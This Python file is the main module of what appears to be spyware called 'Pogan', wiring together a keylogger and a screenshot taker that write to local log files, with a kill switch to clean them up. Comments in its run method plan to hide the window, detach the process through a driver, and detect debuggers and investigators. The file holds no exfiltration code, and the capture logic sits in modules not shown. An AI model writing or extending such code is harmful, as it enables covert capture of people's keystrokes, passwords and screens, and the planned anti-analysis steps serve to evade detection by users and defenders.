from typing import List

from keylogger import KeyLogger
from pogan_feature import PoganFeature
from screenshot_taker import ScreenshotTaker


class Pogan:
    def __init__(self, filename='log.txt', log_dir='.'):
        self.features: List[PoganFeature] = []
        self.features.append(KeyLogger(filename, log_dir))
        self.features.append(ScreenshotTaker('scrn.png', filename, log_dir))

    def run(self):
        #hide window
        #run driver that detach process
        #run checking for debugger, investigation thread

        for feature in self.features:
            feature.run()

    def kill_switch(self):
        for feature in self.features:
            feature.clean()
